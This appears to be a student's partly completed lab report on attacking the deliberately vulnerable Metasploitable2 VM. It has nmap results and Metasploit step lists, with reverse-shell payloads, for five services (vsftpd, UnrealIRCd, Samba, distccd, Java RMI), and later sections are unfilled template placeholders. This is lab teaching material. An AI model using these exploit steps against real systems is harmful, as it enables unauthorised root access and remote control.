
# Metasploitable2 Exploitation Report

**Name:** Vera Baiden
**Index Number:** 7354523
**Date:** 2026-09-20
**Target IP:** 192.168.1.4
**Attacker OS / Tools:**  Kali Linux 2026.x, Metasploit Framework x.x, nmap x.x

---

## Reconnaissance Summary
Command: nmap -sV -sC -p- 192.168.1.4

Key findings (65505 closed, notable open ports):
21/tcp   ftp        vsftpd 2.3.4 (anonymous login allowed)
22/tcp   ssh        OpenSSH 4.7p1 Debian
23/tcp   telnet     Linux telnetd
25/tcp   smtp       Postfix smtpd
53/tcp   domain     ISC BIND 9.4.2
80/tcp   http       Apache httpd 2.2.8 (Ubuntu)
111/tcp  rpcbind
139/445  netbios-ssn Samba smbd 3.X-4.X / 3.0.20-Debian
512-514  exec/login/shell (rsh/rlogin, no auth)
1099/tcp java-rmi   GNU Classpath grmiregistry
1524/tcp bindshell  "Metasploitable root shell"
2049/tcp nfs
3306/tcp mysql      MySQL 5.0.51a-3ubuntu5
3632/tcp distccd    v1 4.2.4
5432/tcp postgresql PostgreSQL 8.3.0-8.3.7
5900/tcp vnc        VNC (protocol 3.3)
6667/tcp irc        UnrealIRCd
8009/tcp ajp13      Apache Jserv
8180/tcp http       Apache Tomcat/Coyote 1.1




## Exploit 1:  "vsftpd 2.3.4 Backdoor"

- **Service / Port:**  FTP / 21
- **Vulnerability:** intentional backdoor in vsftpd 2.3.4 (CVE-2011-2523) 
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** The vulnerability's trigger is a fixed and known byte sequence. Metasploit automates sending it and catching the resulting shell and saves us from manually crafting the FTP session and connecting to port 6200 ourselves
  
- **Steps:**
  1. msfconsole - lauches Metasploit
  2. search vsftpd - searches for the module    
  3. use exploit/uni/ftp/vsftpd_234_backdoor
  4. set RHOSTS 192.168.1.4 - sets the target
  5. show options - verifies options
  6. set LHOST 192.168.1.3 - necessary beacause this module version defaults to      a Meterpreter payload requiring a listener
  7. exploit - runs the exploit
  8. getuid - confirms root access
   
- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
- 
- **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified the exact        vsftpd version( vsftpd2.3.4)
- Weaponization - selects the matching Metasploitable module
- Delivery - module connects and sends the crafted username to the FTP service
- Exploitation - backdoor triggers, spawning the listener
- Installation, C2 - Mererpreter session is established and gives remote controll

- **Outcome / Impact:** Full root shell on the target with no credentials required

---

## Exploit 2: UnrealIRCd 3.2.8.1 Backdoor

- **Service / Port:** IRC/6667
- **Vulnerability:** Trojanized UnrealIRCd 3.2.8.1
- **Tool Used:**  Metasploit — exploit/unix/irc/unreal_irc_3281_backdoor
- **Why This Tool:** The backdoor's activation string is afixed, undocumented sequence buried in the compromised source. Metasploit's module has this hardcoded and handles registering a fake IRC connection to deliver it which would be tedious to replicate manuallywith raw sockets/netcat
- **Steps:**
  1. search unrealircd
  2. use exploit/unix/irc/unreal_irc_3281_backdoor
  3. set RHOSTS 192.168.1.4
  4. set LHOST 192.168.1.3
- **Evidence:** evidence/exploit1
- **Cyber Kill Chain Stage(s):**  Reconnaissance - nmap identidied UnrealIRCd service on 6667
- Weaponization - selected matching module
- Delivery - module registered an IRC connection and sent the trigger line
- Exploitation - backdoor executed the embedded command
- Installation, C2 - Meterpreter session is established

- **Outcome / Impact:** Remote shell access on the target via the IRC service

## Exploit 3: Samba usermap_script RCE (port 139/445)

- **Service / Port:** SMB/139(Samba)
- **Vulnerability:** Samba 3.0.20-3.0.25rc3 username map script command injection (CVE-2007-2447)
- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
- **Why This Tool:** The injection requires a username string with specific shell metacharacters and syntax that the target's username map script config will pass through unsanitized. Metasploit's module handles the exact malformed login sequence and payload delivery which is fiddly to get right by hand via raw SMB/Samba clientcalls
- **Steps:**
  1. background - kept the exploit 2 Meterpreter session alive
  2. search samba usermap
  3. use exploit/multi/samba/usermap_script which defaulted to cmd/unix/reverse_netcat payload
  4. set RHOSTS 192.168.1.4
  5. set LHOST 192.168.1.3
  6. exploit - opens command shell session 2
  7. whoami / id 
      
- **Evidence:** evidence/exploit3.png>
- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance - nmap identified vulnerable Samba version 3.0.20-Debian
-  Weaponization - selected the matching command-injection module and configured the netcat reverse-she payload
-  Delivery - module sent the crafted malicious username to the SB service 
-  Exploitation - username map script executed the injection shell command  
-  Installation, C2 - reverse netcat shell connected back giving remote control
    
- **Outcome / Impact:** Remote command execution/shell access on the target via SMB


## Exploit 4: distcod Remote Code Execution

- **Service / Port:** distcc/3632
- **Vulnerability:** distccd (distributed compiler daemon) accepts and executes compilation requests from any client with no authentication by default
- 
- **Tool Used:**  Metasploit — exploit/unix/misc/distcc_exec
- 
- **Why This Tool:** distcc's wire protocol for submitting compile jobs is non-trivial to construct manually. Metasploit's module formats a valid distcc job request that smuggles a shell command as the "compilation," which would otherwise require reverse-engineering the distcc protocol by hand
- 
- **Steps:**
  1. search distcc
  2. use exploit/unix/misc/distcc_exec which defaulted to cmd/unix/reverse_bash
  3. set RHOSTS 192.168.1.4
  4. set LHOSTS 192.168.1.3
  5. exploit - first attempt failed(target's bash lacked/dev/tcp support(bad file descriptor errors.
  6. set PAYLOAD cmd/unix/reverse_perl - Perl reverse shell, since bash networking wasn't available
  7. set LPORT 4444
  8. exploit - command shell session opened
  9. whoami 
       
- **Evidence:**  evidence/exploit4.png
- **Cyber Kill Chain Stage(s):**  Reconnaissance - nmap identified distccd v1 on 3632
-  Weaponization - selected module, adapted payload after the default failed to match the target's available interpreters
-  Delivery - crafted distcc job request sent to the daemon
-  Exploitation - daemon executed the embedded Perl reverse shell command
-   Installation, C2 - shell session established
    
- **Outcome / Impact:** Remote command execution on the target 

## Exploit 5: Java RMI Registry RCE(port 1099)

- **Service / Port:** Java RMI/1099
- **Vulnerability:** Insecure default configuration of the Java RMI registry - remote clients can register and invoke arbitrary RMI objects leading to remote code execution when a machine class is loaded
- 
- **Tool Used:**  Metasploit — exploit/multi/misc/java_rmi_server
- 
- **Why This Tool:** Exploiting Java RMI requires implementing an RMI-compliant remote object handshake and serving a malicious Java class via HTTP for the target to load — Metasploit automates both the RMI protocol negotiation and hosting the payload JAR, which would otherwise require writing custom Java RMI client code
  
- **Steps:**
 1. search java_rmi
 2. use exploit/multi/misc/java_rmi_server (defaulted to Java Meterpreter reverse TCP payload)
 3. set RHOSTS 192.168.1.4
 4. set RPORT 1099
 5. set LHOST 192.168.1.3
 6. exploit - started a payload-hosting HTTP server, target's RMI registry called back and loaded the malicious class, Meterpreter session 4 opened
 7. Confirmed with getuid

- **Evidence:**  evidence/exploit5.png
- 
- **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified GNU Classpath grmiregistry on 1099
- Weaponization - selected module, payload JAR prepared and hosted
-  Delivery - target's RMI service was tricked into fetching the payload JAR over HTTP
-  Exploitation - malicious class loaded and executed by the JVM 
-  Installation, C2 - Meterpreter session established
    
- **Outcome / Impact:** Full Meterpreter session on the target via the RMI service
  

## Exploit 6: the "ingreslock" root blindshell (port 1524)

- **Service / Port:** <e.g. FTP / 21>
- **Vulnerability:** <name/CVE if known>
- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
  not a generic "Metasploit is good for exploits" answer.>
- **Steps:**
  1. <exact command/action>
  2. <exact command/action>
  3. <...>
- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
- **Outcome / Impact:** <What access/data/privilege you actually got>

  ## Exploit 7: NFS no_root_squash Misconfiguration(port 2049)

- **Service / Port:** <e.g. FTP / 21>
- **Vulnerability:** <name/CVE if known>
- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
  not a generic "Metasploit is good for exploits" answer.>
- **Steps:**
  1. <exact command/action>
  2. <exact command/action>
  3. <...>
- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
- **Outcome / Impact:** <What access/data/privilege you actually got>

## Exploit 8: MySQL root with no password (port 3306)

- **Service / Port:** <e.g. FTP / 21>
- **Vulnerability:** <name/CVE if known>
- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
  not a generic "Metasploit is good for exploits" answer.>
- **Steps:**
  1. <exact command/action>
  2. <exact command/action>
  3. <...>
- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
- **Outcome / Impact:** <What access/data/privilege you actually got>


  ## Exploit 9: PostgreSQL default credentials (pot 5432)

- **Service / Port:** <e.g. FTP / 21>
- **Vulnerability:** <name/CVE if known>
- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
  not a generic "Metasploit is good for exploits" answer.>
- **Steps:**
  1. <exact command/action>
  2. <exact command/action>
  3. <...>
- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
- **Outcome / Impact:** <What access/data/privilege you actually got>

## Exploit 10: Tomcat manager default credentials - WAR shell upload (port 8180)

- **Service / Port:** <e.g. FTP / 21>
- **Vulnerability:** <name/CVE if known>
- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
  not a generic "Metasploit is good for exploits" answer.>
- **Steps:**
  1. <exact command/action>
  2. <exact command/action>
  3. <...>
- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
- **Outcome / Impact:** <What access/data/privilege you actually got>





  

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. <title> | ✔ | ✔ | ✔ | ✔ | | | |
| 2. <title> | | | | | | | |
| ... | | | | | | | |
| 10. <title> | | | | | | | |

---

## Lessons Learned / Mitigations (optional but recommended)

<For at least 2–3 of your exploits, what would actually fix the vulnerability
(patch, config change, disabling a service, etc.)?>
